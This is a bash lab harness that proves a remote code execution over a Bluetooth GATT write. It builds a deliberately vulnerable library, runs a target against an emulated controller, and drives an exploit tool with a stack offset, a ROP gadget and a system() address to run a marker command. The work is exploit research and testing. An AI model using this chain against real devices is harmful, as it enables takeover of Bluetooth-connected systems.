#!/usr/bin/env bash
# end-to-end action proof: btvirt, bumble target, real att write
set -euo pipefail

root="$(cd "$(dirname "$0")/../.." && pwd)"
logs="$root/lab/build/logs"
build="$root/lab/build/harness"
mkdir -p "$logs" "$build"

cleanup() {
  for pid in ${TARGET_PID:-} ${BT_PID:-} ${SOCAT_A:-} ${SOCAT_B:-}; do
    [ -n "$pid" ] && kill "$pid" 2>/dev/null || true
  done
  rm -f /tmp/bt-server-bredrle /tmp/bt-server-le
}
trap cleanup EXIT

cc -shared -fPIC -O0 -fno-stack-protector -fno-omit-frame-pointer \
  -o "$build/libaction_vuln.so" "$root/lab/harness/action_vuln.c"

"$root/lab/build/bluez/emulator/btvirt" -s >"$logs/btvirt.log" 2>&1 &
BT_PID=$!
sleep 1
socat TCP-LISTEN:9100,fork,reuseaddr UNIX-CONNECT:/tmp/bt-server-bredrle >"$logs/socat-a.log" 2>&1 &
SOCAT_A=$!
socat TCP-LISTEN:9101,fork,reuseaddr UNIX-CONNECT:/tmp/bt-server-le >"$logs/socat-b.log" 2>&1 &
SOCAT_B=$!
sleep 0.3

rm -f "$logs/action-addresses.json" "$logs/action-target.out"
"$root/research/.venv/bin/python" "$root/lab/action_target.py" \
  --transport tcp-client:127.0.0.1:9100 \
  --address F0:00:00:00:00:01 \
  --library "$build/libaction_vuln.so" \
  --log "$logs/action-target.jsonl" \
  --addresses "$logs/action-addresses.json" >"$logs/action-target.out" 2>&1 &
TARGET_PID=$!

for _ in $(seq 1 50); do
  [ -s "$logs/action-addresses.json" ] && break
  sleep 0.1
done
[ -s "$logs/action-addresses.json" ] || { echo "target did not start" >&2; cat "$logs/action-target.out" >&2; exit 1; }

read -r GADGET SYSTEM COMMAND < <("$root/research/.venv/bin/python" - "$logs/action-addresses.json" <<'PY'
import json, sys
data = json.load(open(sys.argv[1]))
print(hex(data["gadget"]), hex(data["system"]), hex(data["command"]))
PY
)

echo "gadget=$GADGET system=$SYSTEM command=$COMMAND" >&2
set +e
timeout 50 "$root/research/.venv/bin/brunel" rce \
  --transport tcp-client:127.0.0.1:9101 \
  --address F0:00:00:00:00:01 \
  --profile x86_64 \
  --offset 264 \
  --gadget "$GADGET" \
  --system "$SYSTEM" \
  --command-addr "$COMMAND" \
  --align-ret "$(printf 0x%x $(( $GADGET + 1 )))" \
  --cmd 'echo PWNED-GATT' \
  --write-mode prepare \
  --scan-seconds 10 \
  --settle 1.0 \
  --recovery 3.0 \
  --hello --no-leak >"$logs/action-rce.json"
status=$?
set -e

sleep 1
cat "$logs/action-rce.json"
if grep -q PWNED-GATT "$logs/action-target.out"; then
  echo "PASS: command executed in the target process"
  exit 0
fi
echo "FAIL: command did not execute (rce exit $status)" >&2
tail -40 "$logs/action-target.out" >&2
exit 1
